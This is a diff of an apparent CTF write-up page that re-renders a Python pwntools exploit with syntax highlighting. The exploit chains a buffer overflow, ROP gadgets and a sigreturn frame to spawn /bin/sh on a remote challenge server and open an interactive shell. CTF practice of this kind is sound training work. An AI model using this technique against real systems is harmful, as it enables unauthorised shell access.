@@ -3,7 +3,7 @@
     <meta charset='utf-8'>
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" href="/assets/css/style.css?v=17941d18d5e8b6597efd5746996c8d7c1374c9d2">
+    <link rel="stylesheet" href="/assets/css/style.css?v=ad89651c35ce1f15ad2e2c36e337606f693f0ac8">
     <script src="https://kit.fontawesome.com/cad5e6b3e1.js" crossorigin="anonymous"></script>
 
 <!-- Begin Jekyll SEO tag v2.7.1 -->
@@ -225,46 +225,46 @@
 <!-- /wp:paragraph -->
 
 <!-- wp:code -->
-<pre class="wp-block-code"><code>from pwn import *
-from time import sleep
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
 
-context.clear(arch="amd64")
-gdbscript = '''
+<span class="n">context</span><span class="p">.</span><span class="n">clear</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>
+<span class="n">gdbscript</span> <span class="o">=</span> <span class="s">'''
 break *0x00400107
 continue
-'''
-data = 0x600124
-dispatcher = 0x00400107
-binsh = "/bin/sh\x00"
-syscall = 0x400105
+'''</span>
+<span class="n">data</span> <span class="o">=</span> <span class="mh">0x600124</span>
+<span class="n">dispatcher</span> <span class="o">=</span> <span class="mh">0x00400107</span>
+<span class="n">binsh</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span>
+<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x400105</span>
 
-payload = (cyclic(256))
-payload += p64(0x400115) #pop rcx
-payload += p64(dispatcher)#rcx
-payload += p64(0x400114)#pop
-payload += p64(data)#rsi
-payload += p64(0x8)#rdx
-payload += p64(0x4000ff)#read
-payload += p64(0x400119)
-payload += p64(syscall)
+<span class="n">payload</span> <span class="o">=</span> <span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">256</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400115</span><span class="p">)</span> <span class="c1">#pop rcx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">dispatcher</span><span class="p">)</span><span class="c1">#rcx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400114</span><span class="p">)</span><span class="c1">#pop
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="c1">#rsi
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x8</span><span class="p">)</span><span class="c1">#rdx
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x4000ff</span><span class="p">)</span><span class="c1">#read
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x400119</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
 
-frame = SigreturnFrame(kernel="amd64")
-frame.rax = 0x3b
-frame.rdi = data
-frame.rsi = 0 
-frame.rdx = 0
-frame.rip = syscall
-payload += str(frame)
+<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">(</span><span class="n">kernel</span><span class="o">=</span><span class="s">"amd64"</span><span class="p">)</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">data</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span> 
+<span class="n">frame</span><span class="p">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">frame</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nb">str</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
 
-#r = gdb.debug('./nanana', gdbscript)
+<span class="c1">#r = gdb.debug('./nanana', gdbscript)
 #r = process('./nanana')
-r = remote('172.104.234.7', 7891)
-r.sendline(payload)
-sleep(1)
-r.sendline(binsh)# instrucciones?
-
-r.interactive()
-</code></pre>
+</span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'172.104.234.7'</span><span class="p">,</span> <span class="mi">7891</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">binsh</span><span class="p">)</span><span class="c1"># instrucciones?
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
 <!-- /wp:code -->
 
                 </section>
